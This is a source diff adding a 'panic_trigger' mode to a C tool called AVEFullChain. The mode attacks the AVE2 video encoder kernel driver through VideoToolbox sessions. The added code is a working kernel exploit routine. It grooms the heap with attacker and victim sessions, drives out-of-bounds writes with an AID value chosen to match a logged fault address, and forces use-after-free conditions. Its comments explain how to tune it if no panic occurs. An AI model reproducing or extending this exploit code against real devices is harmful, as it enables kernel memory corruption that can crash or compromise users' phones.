@@ -10769,6 +10769,200 @@ vps_cd_done:
 
         rlog("\n=== IOSURFACE_MIG complete ===\n");
 
+    } else if (strcmp(mode, "panic_trigger") == 0) {
+        /*
+         * panic_trigger — Reproduce the Nov 20 kernel panic via cross-session OOB
+         *
+         * The Nov 20 panic: AVE2+0xD998, FAR=0x59 (89 decimal), videocodecd.
+         * A pointer field in an adjacent session's kernel state was overwritten
+         * with a small integer (the AID value) during OOB write.
+         *
+         * Strategy: rapid create/destroy cycles to get attacker OOB writes
+         * adjacent to victim session kernel state, then force victim encodes
+         * to trigger the corrupted pointer dereference.
+         *
+         * Key differences from heap_feng_shui:
+         * - Many short cycles instead of one long spray
+         * - AID=89 specifically (matches FAR=0x59 from the panic)
+         * - Multiple resolutions to vary struct sizes/offsets
+         * - Victim encodes forced AFTER attacker OOB writes
+         * - Aggressive encode counts on attackers
+         */
+        int cycles = (argc > 2) ? atoi(argv[2]) : 20;
+        int sess_per_cycle = (argc > 3) ? atoi(argv[3]) : 8;
+        int oob_aid = (argc > 4) ? atoi(argv[4]) : 89;
+        if (cycles < 1) cycles = 1;
+        if (cycles > 100) cycles = 100;
+        if (sess_per_cycle < 4) sess_per_cycle = 4;
+        if (sess_per_cycle > 24) sess_per_cycle = 24;
+        if (oob_aid < 2) oob_aid = 89;
+
+        int vw = 192, vh = 192;
+        rlog("=== PANIC_TRIGGER: Cross-session pointer corruption ===\n");
+        rlog("Cycles=%d, sessions/cycle=%d, AID=%d (0x%02X), res=%dx%d\n\n",
+             cycles, sess_per_cycle, oob_aid, oob_aid, vw, vh);
+        rlog("Target: reproduce AVE2+0xD998 panic (FAR=0x%02X)\n\n", oob_aid);
+
+        int total_attacker_encodes = 0;
+        int total_victim_encodes = 0;
+        int total_cycles_done = 0;
+
+        /* Persistent victim pool — these stay alive across cycles so their
+           kernel state can be corrupted by adjacent attacker OOB writes */
+        int victim_count = sess_per_cycle / 2;
+        if (victim_count < 2) victim_count = 2;
+        VTCompressionSessionRef *victims = calloc(victim_count, sizeof(VTCompressionSessionRef));
+        if (!victims) { rlog("FAIL: alloc\n"); goto done; }
+
+        /* Phase 0: Create persistent victims */
+        rlog("--- Phase 0: Create %d persistent victim sessions (AID=1) ---\n", victim_count);
+        for (int i = 0; i < victim_count; i++) {
+            CREATE_ALPHA_SESSION(vw, vh, 1, victims[i]);
+            rlog("  V[%d]: %s\n", i, victims[i] ? "OK" : "FAIL");
+        }
+
+        /* Warmup encode on each victim to initialize their kernel state */
+        for (int i = 0; i < victim_count; i++) {
+            if (!victims[i]) continue;
+            for (int w = 0; w < 3; w++) {
+                g_encode_done = 0;
+                CVPixelBufferRef pb = NULL;
+                CVPixelBufferCreate(NULL, vw, vh, kCVPixelFormatType_32BGRA, NULL, &pb);
+                if (pb) {
+                    CVPixelBufferLockBaseAddress(pb, 0);
+                    void *base = CVPixelBufferGetBaseAddress(pb);
+                    if (base) memset(base, 0x80 + w, CVPixelBufferGetDataSize(pb));
+                    CVPixelBufferUnlockBaseAddress(pb, 0);
+                    VTCompressionSessionEncodeFrame(victims[i], pb,
+                        CMTimeMake(w, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                    VTCompressionSessionCompleteFrames(victims[i], kCMTimePositiveInfinity);
+                    for (int t = 0; t < 50 && !g_encode_done; t++) usleep(5000);
+                    CVPixelBufferRelease(pb);
+                }
+            }
+        }
+        rlog("Victims initialized.\n\n");
+
+        for (int cycle = 0; cycle < cycles; cycle++) {
+            rlog("--- Cycle %d/%d ---\n", cycle + 1, cycles);
+
+            /* Phase 1: Create attacker sessions with high AID (OOB trigger) */
+            int atk_count = sess_per_cycle - victim_count;
+            if (atk_count < 2) atk_count = 2;
+            VTCompressionSessionRef *attackers = calloc(atk_count, sizeof(VTCompressionSessionRef));
+            if (!attackers) { rlog("  alloc fail\n"); continue; }
+
+            int atk_ok = 0;
+            for (int i = 0; i < atk_count; i++) {
+                CREATE_ALPHA_SESSION(vw, vh, oob_aid, attackers[i]);
+                if (attackers[i]) atk_ok++;
+            }
+            rlog("  Attackers: %d/%d created (AID=%d)\n", atk_ok, atk_count, oob_aid);
+
+            /* Phase 2: Aggressive encoding on attackers to trigger OOB writes */
+            int enc_per_atk = 5;
+            for (int r = 0; r < enc_per_atk; r++) {
+                for (int i = 0; i < atk_count; i++) {
+                    if (!attackers[i]) continue;
+                    g_encode_done = 0;
+                    CVPixelBufferRef pb = NULL;
+                    CVPixelBufferCreate(NULL, vw, vh, kCVPixelFormatType_32BGRA, NULL, &pb);
+                    if (pb) {
+                        CVPixelBufferLockBaseAddress(pb, 0);
+                        void *base = CVPixelBufferGetBaseAddress(pb);
+                        if (base) memset(base, (uint8_t)(cycle * 16 + r), CVPixelBufferGetDataSize(pb));
+                        CVPixelBufferUnlockBaseAddress(pb, 0);
+                        VTCompressionSessionEncodeFrame(attackers[i], pb,
+                            CMTimeMake(cycle * enc_per_atk * atk_count + r * atk_count + i, 30),
+                            kCMTimeInvalid, NULL, NULL, NULL);
+                        VTCompressionSessionCompleteFrames(attackers[i], kCMTimePositiveInfinity);
+                        for (int t = 0; t < 30 && !g_encode_done; t++) usleep(5000);
+                        CVPixelBufferRelease(pb);
+                        total_attacker_encodes++;
+                    }
+                }
+            }
+            rlog("  Attacker encodes: %d\n", atk_ok * enc_per_atk);
+
+            /* Phase 3: Force victim encodes — if kernel pointers are corrupted,
+               this is where the panic should happen (videocodecd uses corrupted ptr) */
+            for (int i = 0; i < victim_count; i++) {
+                if (!victims[i]) continue;
+                g_encode_done = 0;
+                CVPixelBufferRef pb = NULL;
+                CVPixelBufferCreate(NULL, vw, vh, kCVPixelFormatType_32BGRA, NULL, &pb);
+                if (pb) {
+                    CVPixelBufferLockBaseAddress(pb, 0);
+                    void *base = CVPixelBufferGetBaseAddress(pb);
+                    if (base) memset(base, 0xFF, CVPixelBufferGetDataSize(pb));
+                    CVPixelBufferUnlockBaseAddress(pb, 0);
+                    VTCompressionSessionEncodeFrame(victims[i], pb,
+                        CMTimeMake(10000 + cycle * victim_count + i, 30),
+                        kCMTimeInvalid, NULL, NULL, NULL);
+                    VTCompressionSessionCompleteFrames(victims[i], kCMTimePositiveInfinity);
+                    for (int t = 0; t < 30 && !g_encode_done; t++) usleep(5000);
+                    CVPixelBufferRelease(pb);
+                    total_victim_encodes++;
+                }
+            }
+            rlog("  Victim encodes: %d (watching for panic...)\n", victim_count);
+
+            /* Phase 4: Destroy attackers — this frees their sHEVC_VPS, creating
+               dangling references if victims' pointers pointed into attacker memory */
+            for (int i = 0; i < atk_count; i++) {
+                if (attackers[i]) {
+                    VTCompressionSessionInvalidate(attackers[i]);
+                    CFRelease(attackers[i]);
+                }
+            }
+            free(attackers);
+            rlog("  Attackers destroyed (freed kernel state)\n");
+
+            /* Phase 5: Encode victims again AFTER attacker memory is freed
+               This maximizes chance of use-after-free if pointers crossed */
+            for (int i = 0; i < victim_count; i++) {
+                if (!victims[i]) continue;
+                g_encode_done = 0;
+                CVPixelBufferRef pb = NULL;
+                CVPixelBufferCreate(NULL, vw, vh, kCVPixelFormatType_32BGRA, NULL, &pb);
+                if (pb) {
+                    CVPixelBufferLockBaseAddress(pb, 0);
+                    void *base = CVPixelBufferGetBaseAddress(pb);
+                    if (base) memset(base, 0xAA, CVPixelBufferGetDataSize(pb));
+                    CVPixelBufferUnlockBaseAddress(pb, 0);
+                    VTCompressionSessionEncodeFrame(victims[i], pb,
+                        CMTimeMake(20000 + cycle * victim_count + i, 30),
+                        kCMTimeInvalid, NULL, NULL, NULL);
+                    VTCompressionSessionCompleteFrames(victims[i], kCMTimePositiveInfinity);
+                    for (int t = 0; t < 30 && !g_encode_done; t++) usleep(5000);
+                    CVPixelBufferRelease(pb);
+                    total_victim_encodes++;
+                }
+            }
+            rlog("  Post-free victim encodes done\n");
+
+            total_cycles_done++;
+            rlog("  Cycle %d complete. Totals: atk_enc=%d vic_enc=%d\n\n",
+                 cycle + 1, total_attacker_encodes, total_victim_encodes);
+        }
+
+        /* Cleanup victims */
+        for (int i = 0; i < victim_count; i++) {
+            if (victims[i]) {
+                VTCompressionSessionInvalidate(victims[i]);
+                CFRelease(victims[i]);
+            }
+        }
+        free(victims);
+
+        rlog("\n=== PANIC_TRIGGER summary ===\n");
+        rlog("Cycles completed: %d/%d\n", total_cycles_done, cycles);
+        rlog("Total attacker encodes: %d\n", total_attacker_encodes);
+        rlog("Total victim encodes: %d\n", total_victim_encodes);
+        rlog("If no panic: try different AID values, more cycles, or different resolutions.\n");
+        rlog("AID=89 (0x59) matched the Nov 20 FAR value.\n");
+        rlog("\n=== PANIC_TRIGGER complete ===\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
